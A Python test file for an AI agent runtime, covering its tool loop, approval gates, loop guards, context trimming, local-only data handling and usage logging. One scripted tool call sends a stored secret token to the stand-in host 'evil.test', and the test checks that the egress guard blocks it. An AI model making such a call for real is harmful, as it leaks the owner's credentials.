from __future__ import annotations

import asyncio
import json
from datetime import datetime, timedelta
from typing import Any

from daedalus.config import Settings
from daedalus.loop.engine import _TRIMMED, Engine
from daedalus.model.client import ModelClient
from daedalus.model.providers import (
    ChatResult,
    ContextOverflowError,
    ScriptedProvider,
    ToolCall,
    TransientProviderError,
)
from daedalus.runtime import Runtime, build_runtime
from daedalus.surface.base import InboundEvent
from daedalus.surface.cli import ScriptedSurface
from daedalus.tools.base import Tool, ToolResult, params
from tests.conftest import tool_call


def _denied(settings: Settings) -> tuple[Runtime, ScriptedSurface]:
    """A runtime whose owner denies every approval it is shown."""
    surface = ScriptedSurface(approve=False)
    return build_runtime(settings, surface=surface, provider=ScriptedProvider([])), surface


async def test_a_turn_runs_its_steps_one_at_a_time_and_never_overlaps_another(
    runtime: Runtime,
) -> None:
    """Free text drives the model/tool loop to an answer, one step at a time.

    Two properties share this test because both are about *how a turn executes*:
    the preview belongs to the current step rather than the whole turn, and the
    lock belongs to the Runtime — so a re-sent message waits instead of racing
    the first turn, swapping `ctx.session` (the policy every tool reads,
    `local_only` included) and answering the owner out of order.
    """
    pieces: list[str] = []
    restarts: list[int] = []

    async def collect(piece: str) -> None:
        pieces.append(piece)

    async def restart() -> None:
        restarts.append(1)

    # case: one tool call, then prose — the tool's effect is real and remembered.
    runtime.model = ModelClient(
        runtime.settings,
        providers=[
            ScriptedProvider(
                [
                    tool_call("memory", op="write", facet="projects", content="cut the release"),
                    ChatResult(content="Noted."),
                ]
            )
        ],
    )
    result = await Engine(runtime).run_turn(
        InboundEvent(text="remember we cut the release", user_id="owner"),
        on_delta=collect,
        on_restart=restart,
    )
    assert result.text == "Noted."
    assert result.tools_used == ["memory"]
    assert runtime.memory.recall("release")
    assert "".join(pieces).strip() == "Noted.", "the streamed preview was not the answer"
    assert len(restarts) == 2, "one preview reset before each model call, not per turn"

    # case: the loop keeps going — write, read it back, then answer.
    runtime.model = ModelClient(
        runtime.settings,
        providers=[
            ScriptedProvider(
                [
                    tool_call("files", op="write", path=str(runtime.settings.home / "note.txt"), content="hi"),
                    tool_call("files", op="read", path=str(runtime.settings.home / "note.txt")),
                    ChatResult(content="Wrote it, read it back."),
                ]
            )
        ],
    )
    result = await Engine(runtime).run_turn(InboundEvent(text="write and verify a note", user_id="owner"))
    assert result.steps == 3
    assert result.text.startswith("Wrote it")

    # case: two messages, two Engine instances, one Runtime — the second waits.
    _TurnRef.live = _TurnRef.peak = 0
    runtime.tools.register(_TurnRef())
    runtime.model = ModelClient(runtime.settings, providers=[ScriptedProvider([_call_then_echo] * 8)])

    first, second = await asyncio.gather(
        Engine(runtime).run_turn(_event("chan-a")),
        Engine(runtime).run_turn(_event("chan-b")),
    )

    assert _TurnRef.peak == 1, "two turns ran at the same time"
    assert "chan-a" in first.text, "the first turn was answered under the second's session"
    assert "chan-b" in second.text, "the second turn was answered under the first's session"


async def test_a_turn_that_is_not_progressing_is_bounded_and_told_why(runtime: Runtime) -> None:
    """The loop refuses to spend the whole budget on one dead end.

    The acceptance run spent 16 steps retrying one broken call identically. The
    guard counts *consecutive, identical* failures — keyed on the call and its
    arguments, not just the error text — tells the model it is repeating before
    it stops, and spends at most two corrections per turn on distinct dead ends.
    """
    # case: the step limit stops a runaway whatever the model does.
    runtime.settings.max_steps = 3
    runtime.model = ModelClient(
        runtime.settings,
        providers=[ScriptedProvider([tool_call("memory", op="write", facet="x", content="loop")] * 10)],
    )
    result = await Engine(runtime).run_turn(InboundEvent(text="loop forever", user_id="owner"))
    assert result.steps == 3
    assert "step limit" in result.text

    # case: three identical failures earn a correction; the fourth ends the turn.
    runtime.settings.max_steps = 16
    provider = ScriptedProvider([tool_call("capability", op="author")] * 10)
    runtime.model = ModelClient(runtime.settings, providers=[provider])
    result = await Engine(runtime).run_turn(InboundEvent(text="make me a capability", user_id="owner"))
    assert result.steps == 4, "the third identical failure should correct, the fourth should stop"
    assert result.error == "repeated failure"
    assert "stuck repeating" in result.text
    told = [m for call in provider.calls for m in call if m.get("role") == "user"]
    correction = [m["content"] for m in told if m["content"].startswith("Stop —")]
    assert correction, "the model was never told it was repeating"
    assert "failed 3 times in a row" in correction[0]

    # case: two distinct dead ends each get one correction; a third ends the turn.
    runtime.model = ModelClient(
        runtime.settings,
        providers=[
            ScriptedProvider(
                [
                    *([tool_call("capability", op="author", name="alpha")] * 3),
                    *([tool_call("capability", op="author", name="beta")] * 3),
                    *([tool_call("capability", op="author", name="gamma")] * 3),
                    ChatResult(content="Never reached."),
                ]
            )
        ],
    )
    result = await Engine(runtime).run_turn(InboundEvent(text="author things", user_id="owner"))
    assert result.error == "repeated failure", "a third dead end must not get a third correction"
    assert result.steps == 9

    # case: progress between failures resets the count.
    runtime.model = ModelClient(
        runtime.settings,
        providers=[
            ScriptedProvider(
                [
                    tool_call("capability", op="author"),  # fails
                    tool_call("memory", op="write", facet="x", content="ok"),  # succeeds: resets
                    tool_call("capability", op="author"),  # fails again
                    ChatResult(content="Recovered."),
                ]
            )
        ],
    )
    result = await Engine(runtime).run_turn(InboundEvent(text="try again", user_id="owner"))
    assert result.text == "Recovered."

    # case: same error, different arguments — three attempts, not one repeat.
    runtime.model = ModelClient(
        runtime.settings,
        providers=[
            ScriptedProvider(
                [
                    tool_call("capability", op="author", name="alpha"),
                    tool_call("capability", op="author", name="beta"),
                    tool_call("capability", op="author", name="gamma"),
                    ChatResult(content="Recovered."),
                ]
            )
        ],
    )
    result = await Engine(runtime).run_turn(InboundEvent(text="author three probes", user_id="owner"))
    assert result.text == "Recovered.", "different calls were collapsed into a repeat"
    assert result.steps == 4


async def test_a_stopped_turn_tells_the_owner_what_happened_and_holds_the_ledger(
    runtime: Runtime,
) -> None:
    """A turn the loop stopped is explained, not left as "I got stuck".

    The tool's error travels fenced (markdown would otherwise eat the asterisks
    in a cron), the running ledger is held rather than deleted, the arguments
    that kept failing are shown, and a tool that refused with a question hands
    that question up instead of an account of the loop's own bad turn.
    """
    # case: a stuck turn fences the error and asks the surface to keep its ledger.
    runtime.settings.max_steps = 16
    runtime.model = ModelClient(
        runtime.settings,
        providers=[ScriptedProvider([tool_call("capability", op="author")] * 10)],
    )
    result = await Engine(runtime).run_turn(InboundEvent(text="make me a capability", user_id="owner"))
    assert result.text.count("```") >= 2, (
        f"the tool's error must travel fenced, or markdown rewrites it:\n{result.text}"
    )
    held_after_stuck = runtime.surface.held
    assert held_after_stuck == 1, (
        "a turn the loop stopped must ask the surface to keep its ledger — "
        "the reply summarizes one failing call, the trace shows all of them"
    )

    # case: the hold is for stopped turns — an answered turn does not add one.
    runtime.model = ModelClient(
        runtime.settings, providers=[ScriptedProvider([ChatResult(content="done.")])]
    )
    result = await Engine(runtime).run_turn(InboundEvent(text="hello", user_id="owner"))
    assert result.error == ""
    assert runtime.surface.held == held_after_stuck

    # case: the arguments that kept failing are shown to the owner.
    runtime.settings.max_steps = 8
    runtime.model = ModelClient(
        runtime.settings,
        providers=[ScriptedProvider([tool_call("capability", op="author", name="probe")] * 5)],
    )
    result = await Engine(runtime).run_turn(InboundEvent(text="author probe", user_id="owner"))
    assert result.error == "repeated failure"
    assert "probe" in result.text, "the arguments that kept failing were not shown"

    # case: the tool's refusal was a question — hand it up, with the ids.
    first = runtime.calendar.add(summary="LeetCode Weekly Contest 524", start="2026-10-18T08:00")
    second = runtime.calendar.add(summary="LeetCode Weekly Contest 524", start="2026-10-18T08:00")
    runtime.settings.max_steps = 16
    runtime.model = ModelClient(
        runtime.settings,
        providers=[
            ScriptedProvider([tool_call("calendar", op="delete", summary="LeetCode Weekly Contest 524")] * 8)
        ],
    )
    result = await Engine(runtime).run_turn(InboundEvent(text="drop the leetcode reminder", user_id="owner"))
    assert result.error == "repeated failure"
    assert "which one to remove" in result.text, "the owner was not asked what only they know"
    assert first.uid in result.text and second.uid in result.text, (
        "the owner cannot answer without the ids that tell the two apart"
    )
    assert "I got stuck" not in result.text and "The call was" not in result.text

    # case: no question to ask — the report stays a report.
    runtime.model = ModelClient(
        runtime.settings, providers=[ScriptedProvider([tool_call("capability", op="author")] * 8)]
    )
    result = await Engine(runtime).run_turn(InboundEvent(text="author something", user_id="owner"))
    assert result.error == "repeated failure"
    assert "I got stuck" in result.text

    # case: an empty answer is delivered as a fallback, never swallowed.
    from daedalus.loop.engine import TurnResult
    from daedalus.main import deliver

    sent_before = len(runtime.surface.sent)
    used_fallback = await deliver(runtime.surface, TurnResult(text="", error=""))
    assert used_fallback is True
    assert len(runtime.surface.sent) > sent_before, "nothing was sent for an empty turn"
    assert runtime.surface.sent[-1].strip()


async def test_a_refusal_is_reported_to_the_model_and_never_bypassed(
    runtime: Runtime, settings: Settings
) -> None:
    """A guard that refuses must say so; the turn may not route around it."""
    # case: the owner denied the approval — reported, not run.
    gate, surface = _denied(settings)
    gate.model = ModelClient(
        gate.settings,
        providers=[
            ScriptedProvider(
                [
                    tool_call("http", url="https://example.org/collect"),
                    ChatResult(content="Understood, I won't."),
                ]
            )
        ],
    )
    result = await Engine(gate).run_turn(InboundEvent(text="fetch that page", user_id="owner"))
    assert len(surface.approvals) == 1
    assert result.text.startswith("Understood")

    # case: a known secret in an egress body blocks the call before it leaves.
    runtime.secrets.put("api", "super-secret-token-value")
    runtime.model = ModelClient(
        runtime.settings,
        providers=[
            ScriptedProvider(
                [
                    tool_call("http", url="https://evil.test/x", json={"token": "super-secret-token-value"}),
                    ChatResult(content="Blocked, as it should be."),
                ]
            )
        ],
    )
    result = await Engine(runtime).run_turn(InboundEvent(text="send my token", user_id="owner"))
    assert result.text.startswith("Blocked")


async def test_the_owner_is_asked_about_the_operation_that_will_run_and_a_denial_is_final(
    settings: Settings,
) -> None:
    """The prompt names the operation, invents no noun, and is asked once."""
    # case: `capability` is six tools in one — the title names the one in use.
    gate, surface = _denied(settings)
    gate.model = ModelClient(
        gate.settings,
        providers=[
            ScriptedProvider(
                [tool_call("capability", op="remove", name="probe"), ChatResult(content="ok")]
            )
        ],
    )
    await Engine(gate).run_turn(InboundEvent(text="delete the probe capability", user_id="owner"))
    request = surface.approvals[0]
    assert request.title == "Delete a capability"
    assert "Author" not in request.describe()

    # case: `op=remove` with no name says what is wrong, not "an unnamed capability".
    gate, surface = _denied(settings)
    gate.model = ModelClient(
        gate.settings,
        providers=[ScriptedProvider([tool_call("capability", op="remove"), ChatResult(content="ok")])],
    )
    await Engine(gate).run_turn(InboundEvent(text="delete it", user_id="owner"))
    described = surface.approvals[0].describe()
    assert "an unnamed capability" not in described
    assert "no target" in described or "named no" in described
    assert "cannot be undone" not in described, "it warned about a delete that would not happen"

    # case: a denial is not re-asked. The owner already answered it.
    gate, surface = _denied(settings)
    gate.model = ModelClient(
        gate.settings,
        providers=[
            ScriptedProvider(
                [
                    tool_call("capability", op="remove", name="probe"),
                    tool_call("capability", op="remove", name="probe"),
                    ChatResult(content="I'll stop."),
                ]
            )
        ],
    )
    result = await Engine(gate).run_turn(InboundEvent(text="delete the probe", user_id="owner"))
    assert len(surface.approvals) == 1, "the owner was asked to deny the same call twice"
    assert result.error == "denied"
    assert "denied" in result.text.lower()


async def test_local_only_content_never_reaches_a_remote_model(runtime: Runtime) -> None:
    """SPEC §5: `local_only` values stay home unless the whole chain is local.

    The system prompt carries recent memory and a recall result is fed straight
    back to the model, so both paths are gated — and both are opened when the
    model itself is local, because then nothing leaves.
    """
    from daedalus.security.provenance import DataClass

    # case: the prompt withholds it from a remote model.
    runtime.memory.write(facet="body", content="a shareable fact")
    runtime.memory.write(facet="body", content="a local secret", data_class=DataClass.LOCAL_ONLY)
    provider = ScriptedProvider([ChatResult(content="ok")])
    runtime.model = ModelClient(runtime.settings, providers=[provider])
    await Engine(runtime).run_turn(InboundEvent(text="hello", user_id="owner"))
    sent = provider.calls[0][0]["content"]
    assert "a shareable fact" in sent
    assert "a local secret" not in sent, "a local_only fact left the machine"

    # case: a fully local chain may see it — nothing leaves the machine anyway.
    local = ScriptedProvider([ChatResult(content="ok")], is_local=True)
    runtime.model = ModelClient(runtime.settings, providers=[local])
    await Engine(runtime).run_turn(InboundEvent(text="hello", user_id="owner"))
    assert "a local secret" in local.calls[0][0]["content"]

    # case: a tool result fed back to a remote model is held to the same rule.
    recall = ScriptedProvider(
        [
            tool_call("memory", op="recall", query="local", content="", facet="body"),
            ChatResult(content="done"),
        ]
    )
    runtime.model = ModelClient(runtime.settings, providers=[recall])
    await Engine(runtime).run_turn(InboundEvent(text="what do you know", user_id="owner"))
    results = [m for m in recall.calls[-1] if m.get("role") == "tool"]
    assert results, "the tool result never made it back to the model"
    assert "a local secret" not in results[-1]["content"]


async def test_the_context_is_kept_within_the_window_by_trimming_only_old_tool_results(
    runtime: Runtime, monkeypatch: Any
) -> None:
    """The system prompt, the ask and the last two results are never trimmed.

    One 25 KB result degraded every later model call, so a single result is
    capped. On overflow (or before it, from the budget) the oldest tool results
    are replaced with a marker: recovery is not progress and spends no step, a
    second overflow is refused in the owner's words, and an unsatisfiable budget
    says so instead of looping. An unknown window is not guessed at.
    """
    from daedalus.loop import engine as engine_mod
    from daedalus.loop.budget import over_budget
    from daedalus.loop.engine import MAX_TOOL_CHARS, _fit_context

    # case: one huge tool result is capped with a marker before it is fed back.
    big = runtime.settings.home / "big.txt"
    big.write_text("x" * (MAX_TOOL_CHARS * 3))
    provider = ScriptedProvider(
        [
            tool_call("files", op="read", path=str(big)),
            ChatResult(content="Read a slice of it."),
        ]
    )
    runtime.model = ModelClient(runtime.settings, providers=[provider])
    result = await Engine(runtime).run_turn(InboundEvent(text="read the big file", user_id="owner"))
    assert result.text == "Read a slice of it."
    tool_messages = [m for m in provider.calls[-1] if m.get("role") == "tool"]
    assert tool_messages, "the tool result never made it back to the model"
    fed_back = tool_messages[-1]["content"]
    assert "truncated" in fed_back, "the whole file was fed back unchecked"
    assert len(fed_back) < MAX_TOOL_CHARS + 500

    # case: an overflow trims the oldest result, retries, and spends no step.
    provider = OverflowsOnce(_three_notes_and_an_answer())
    runtime.model = ModelClient(runtime.settings, providers=[provider])
    result = await Engine(runtime).run_turn(InboundEvent(text="keep three notes", user_id="owner"))
    assert result.text == "Answered with less."
    assert provider.calls == 5
    assert result.steps == 4, "recovery is not progress and must not spend a step"
    tool_messages = [m for m in provider.seen[-1] if m.get("role") == "tool"]
    assert len(tool_messages) == 3
    assert tool_messages[0]["content"] == _TRIMMED
    assert tool_messages[1]["content"] != _TRIMMED
    assert tool_messages[2]["content"] != _TRIMMED, "the last two results are what it is using"

    # case: a second overflow is refused in the owner's words, not retried forever.
    provider = OverflowsOnce(_three_notes_and_an_answer(), always=True)
    runtime.model = ModelClient(runtime.settings, providers=[provider])
    result = await Engine(runtime).run_turn(InboundEvent(text="keep three notes", user_id="owner"))
    assert "bigger than the model's context window" in result.text
    assert result.error.startswith("context overflow")

    # case: the same trim, applied before the call — oldest goes, newest stays.
    messages: list[dict[str, Any]] = [
        {"role": "system", "content": "system " * 100},
        {"role": "tool", "tool_call_id": "1", "content": "a" * 8000},
        {"role": "tool", "tool_call_id": "2", "content": "b" * 8000},
        {"role": "tool", "tool_call_id": "3", "content": "c" * 8000},
        {"role": "user", "content": "the ask"},
    ]
    assert over_budget(messages, 7000), "the request is over the window's budget"
    assert _fit_context(messages, 7000) is True
    assert messages[0]["content"] == "system " * 100, "the system prompt is never touched"
    assert messages[-1]["content"] == "the ask", "the ask is never touched"
    assert messages[1]["content"] == _TRIMMED
    assert messages[2]["content"] == "b" * 8000
    assert messages[3]["content"] == "c" * 8000, "the last two results are what it is using"
    assert not over_budget(messages, 7000)

    # case: a budget that cannot be met refuses without destroying anything.
    stuck = [
        {"role": "system", "content": "s"},
        {"role": "tool", "tool_call_id": "1", "content": "a" * 8000},
        {"role": "tool", "tool_call_id": "2", "content": "b" * 8000},
        {"role": "user", "content": "the ask"},
    ]
    assert _fit_context(stuck, 100) is False
    assert stuck[1]["content"] == "a" * 8000, "nothing was destroyed for nothing"

    # case: the engine consults the budget once per step, with the chain's window.
    seen: list[int] = []

    def fake_fit(messages: list[dict[str, Any]], window: int, extra: int = 0) -> bool:
        seen.append(window)
        return False

    monkeypatch.setattr(engine_mod, "_fit_context", fake_fit)
    runtime.model = ModelClient(
        runtime.settings, providers=[ScriptedProvider([ChatResult(content="hi")])]
    )
    runtime.model.context_window = lambda *a, **k: 4096  # type: ignore[method-assign]
    await Engine(runtime).run_turn(InboundEvent(text="hi", user_id="owner"))
    assert seen == [4096]

    # case: an unknown window means let the provider answer.
    seen.clear()
    runtime.model = ModelClient(
        runtime.settings, providers=[ScriptedProvider([ChatResult(content="hi")])]
    )
    runtime.model.context_window = lambda *a, **k: 0  # type: ignore[method-assign]
    await Engine(runtime).run_turn(InboundEvent(text="hi", user_id="owner"))
    assert seen == [], "an unknown window means let the provider answer"


async def test_a_conversation_outlives_a_dead_end_and_a_restart(runtime: Runtime) -> None:
    """A turn is remembered however it ends, and a restart is not amnesia.

    Only turns that ended in prose were recorded, so a turn the guard cut short
    left no trace and the owner's last message was dropped; and `history` lived
    in the process, so a daemon restart erased the conversation. Both are now in
    the transcript, and the transcript is replayed into the next prompt.
    """
    # case: a dead end still leaves the owner's words and the stop reply behind.
    runtime.model = ModelClient(
        runtime.settings,
        providers=[ScriptedProvider([tool_call("capability", op="author")] * 5)],
    )
    result = await Engine(runtime).run_turn(InboundEvent(text="give me a contest alert", user_id="owner"))
    assert result.error == "repeated failure"
    remembered = [m["content"] for m in runtime.recent("owner", 24)]
    assert "give me a contest alert" in remembered, "the owner's message was dropped"
    assert "stuck repeating" in remembered[-1], "the reply that ended the turn was dropped"

    # case: an answered turn survives a new process, and is replayed to the model.
    runtime.model = ModelClient(
        runtime.settings, providers=[ScriptedProvider([ChatResult(content="Noted.")])]
    )
    await Engine(runtime).run_turn(InboundEvent(text="the deadline is Friday", user_id="owner"))

    restarted = build_runtime(runtime.settings, provider=ScriptedProvider([]))
    conversation = restarted.recent("owner", 24)
    assert conversation, "the conversation did not outlive the process"
    assert conversation[-2]["content"] == "the deadline is Friday"
    assert conversation[-1]["content"] == "Noted."

    provider = ScriptedProvider([ChatResult(content="ok")])
    restarted.model = ModelClient(restarted.settings, providers=[provider])
    await Engine(restarted).run_turn(InboundEvent(text="when is it?", user_id="owner"))
    sent = "\n".join(str(m.get("content")) for m in provider.calls[0])
    assert "the deadline is Friday" in sent, "the replayed conversation never reached the model"


def _twice(tool: str, **arguments: object) -> ChatResult:
    """The same call, twice, in one assistant message — different ids, same bytes."""
    return ChatResult(
        tool_calls=[
            ToolCall(id="call_1", name=tool, arguments=dict(arguments)),
            ToolCall(id="call_2", name=tool, arguments=dict(arguments)),
        ]
    )


async def test_a_call_sent_twice_in_one_step_runs_once(runtime: Runtime) -> None:
    """A repeated call is not a repeated intent — but every id must be answered.

    On 17 Oct two byte-identical `calendar op=create` calls in one message both
    ran, and the owner got two reminders. Each id still needs its own tool
    message or the next request is malformed, the duplicate must be told it ran
    once, and the duplicate is one attempt so it cannot burn a second strike.
    """
    # case: one effect, one event, one reply.
    runtime.model = ModelClient(
        runtime.settings,
        providers=[
            ScriptedProvider(
                [
                    _twice(
                        "calendar",
                        op="create",
                        summary="LeetCode Weekly Contest 524",
                        start=(datetime.now() + timedelta(days=1)).strftime("%Y-%m-%dT08:00"),
                    ),
                    ChatResult(content="One reminder set."),
                ]
            )
        ],
    )
    result = await Engine(runtime).run_turn(
        InboundEvent(text="reminder for tomorrow's contest", user_id="owner")
    )
    assert result.text == "One reminder set."
    assert len(runtime.calendar.series()) == 1, "the repeated call created a second event"

    # case: both ids are answered, and the duplicate is told it was a repeat.
    provider = ScriptedProvider([_twice("calendar", op="list"), ChatResult(content="Done.")])
    runtime.model = ModelClient(runtime.settings, providers=[provider])
    await Engine(runtime).run_turn(InboundEvent(text="what is on", user_id="owner"))
    sent = provider.calls[1]
    answered = [m["tool_call_id"] for m in sent if m.get("role") == "tool"]
    assert answered == ["call_1", "call_2"]
    assert "ran once" in sent[-1]["content"], "the model was not told its call was a repeat"

    # case: the doubled first step counts as one failure, not two.
    runtime.model = ModelClient(
        runtime.settings,
        providers=[
            ScriptedProvider(
                [
                    _twice("capability", op="author"),
                    tool_call("capability", op="author"),
                    tool_call("capability", op="author"),
                    tool_call("capability", op="author"),
                ]
            )
        ],
    )
    result = await Engine(runtime).run_turn(InboundEvent(text="author something", user_id="owner"))
    # Three distinct failures earn the correction, the fourth ends the turn. The
    # doubled first step contributed one, so this ends at 4 steps and not 3.
    assert result.steps == 4
    assert result.error == "repeated failure"


async def test_every_turn_leaves_a_usage_record_of_structure_only(runtime: Runtime) -> None:
    """The ledger answers "which model is slow" without ever holding the words.

    Tokens and time are recorded when reported and estimated when they are not
    (zero would be a lie), retries and the failing entry are named so a slow
    turn and a flaky one can be told apart, and the owner's text never enters.
    """

    def last_entry() -> dict[str, Any]:
        path = runtime.settings.home / "state" / "usage.jsonl"
        return json.loads(path.read_text(encoding="utf-8").splitlines()[-1])

    # case: a reported usage block, the seat, the outcome — and no text.
    runtime.model = ModelClient(
        runtime.settings,
        providers=[
            ScriptedProvider(
                [ChatResult(content="done", usage={"prompt_tokens": 120, "completion_tokens": 8})]
            )
        ],
    )
    result = await Engine(runtime).run_turn(InboundEvent(text="just answer", user_id="owner"))
    assert (result.tokens_in, result.tokens_out) == (120, 8)
    assert result.seconds >= 0.0
    entry = last_entry()
    assert entry["seat"] == "daedalus"
    assert entry["tokens_in"] == 120
    assert entry["outcome"] == "ok"
    assert "text" not in entry and "just answer" not in json.dumps(entry), (
        "usage is structure only — never the owner's words"
    )

    # case: a retry is counted and the failure it recovered from is named.
    runtime.model = ModelClient(
        runtime.settings,
        providers=[Intermittent([ChatResult(content="answered", provider="flaky")])],
    )
    result = await Engine(runtime).run_turn(InboundEvent(text="hi", user_id="owner"))
    assert result.text == "answered"
    assert result.retries == 1
    entry = last_entry()
    assert entry["retries"] == 1
    assert entry["failure"] == "TransientProviderError 503"
    assert entry["outcome"] == "ok"

    # case: a failed turn names the entry it tried, not a blank.
    from daedalus.model.providers import QuotaExhaustedError

    runtime.model = ModelClient(
        runtime.settings,
        providers=[
            Intermittent(
                [],
                error=QuotaExhaustedError("doomed HTTP 429: insufficient_quota", status=429),
            )
        ],
    )
    result = await Engine(runtime).run_turn(InboundEvent(text="hi", user_id="owner"))
    assert result.error
    entry = last_entry()
    assert entry["provider"] == "flaky", "the entry that was tried, not a blank"
    assert entry["failure"] == "QuotaExhaustedError 429"
    assert entry["outcome"] == "error"

    # case: no reported usage means estimated tokens, recorded as such.
    runtime.model = ModelClient(
        runtime.settings,
        providers=[ScriptedProvider([ChatResult(content="a short answer")])],
    )
    result = await Engine(runtime).run_turn(InboundEvent(text="say something", user_id="owner"))
    assert result.tokens_in > 0
    assert result.tokens_out > 0
    assert last_entry()["tokens_estimated"] is True


# -- instruments -------------------------------------------------------------


class _TurnRef(Tool):
    """Reports which session this call ran under — after a wait, on purpose.

    The gap is the whole instrument. A turn running alongside another has its
    `ctx.session` replaced while it waits for the model, and this reads the
    session *after* the wait, which is exactly when the wrong one is there.
    """

    name = "turn_ref"
    title = "Say which turn this is"
    description = "Reports which session this call ran under."
    parameters = params()

    live = 0
    peak = 0

    async def run(self, args: dict[str, Any], ctx: Runtime) -> ToolResult:
        type(self).live += 1
        type(self).peak = max(type(self).peak, type(self).live)
        await asyncio.sleep(0.05)
        type(self).live -= 1
        return ToolResult(output=ctx.session.turn_ref if ctx.session else "no session")


def _call_then_echo(messages: list[dict[str, Any]], tools: Any = None) -> ChatResult:
    """Call the recorder once, then hand the model its answer as the reply."""
    if messages and messages[-1].get("role") == "tool":
        return ChatResult(content=str(messages[-1].get("content", "")), provider="scripted")
    return ChatResult(
        tool_calls=[ToolCall(id="call_turn_ref", name="turn_ref", arguments={})],
        provider="scripted",
    )


def _event(channel: str) -> InboundEvent:
    return InboundEvent(text="what's up", user_id="owner", channel_id=channel)


class OverflowsOnce:
    """A provider that reports a context overflow at a chosen call.

    The engine can only recover if the failure is *named* as an overflow, so
    this stands in for NIM's 400 `context_length_exceeded`.
    """

    def __init__(self, script: list[Any], *, fail_at: int = 4, always: bool = False) -> None:
        self._script = list(script)
        self.fail_at = fail_at
        self.always = always
        self.calls = 0
        self.seen: list[list[dict[str, Any]]] = []
        self.name = "overflowy"
        self.model = "m"
        self.window_s = 60
        self.max_calls = 0
        self.is_local = False
        self.retries = 0

    def available(self) -> bool:
        return True

    async def complete(
        self,
        messages: list[dict[str, Any]],
        tools: Any = None,
        on_delta: Any = None,
        temperature: float = 0.3,
    ) -> ChatResult:
        self.calls += 1
        self.seen.append([dict(m) for m in messages])
        if self.calls == self.fail_at or (self.always and self.calls > self.fail_at):
            raise ContextOverflowError("HTTP 400: context_length_exceeded", status=400)
        return self._script.pop(0)


def _three_notes_and_an_answer() -> list[Any]:
    return [
        tool_call("memory", op="write", facet="projects", content="note one"),
        tool_call("memory", op="write", facet="projects", content="note two"),
        tool_call("memory", op="write", facet="projects", content="note three"),
        ChatResult(content="Answered with less."),
    ]


class Intermittent:
    """Fails once with a free retry, then answers — the flaky turn."""

    def __init__(self, script: list[Any], *, error: Exception | None = None) -> None:
        self._script = list(script)
        self.name = "flaky"
        self.model = "m"
        self.window_s = 60
        self.max_calls = 0
        self.is_local = False
        self.retries = 1
        self.retry_budget_s = 10.0
        self.calls = 0
        self._error = error or TransientProviderError(
            "HTTP 503: busy", status=503, retry_after=0.0
        )

    def available(self) -> bool:
        return True

    async def complete(self, messages, tools=None, on_delta=None, temperature=0.3):  # noqa: ANN001
        self.calls += 1
        if self.calls == 1:
            raise self._error
        return self._script.pop(0)
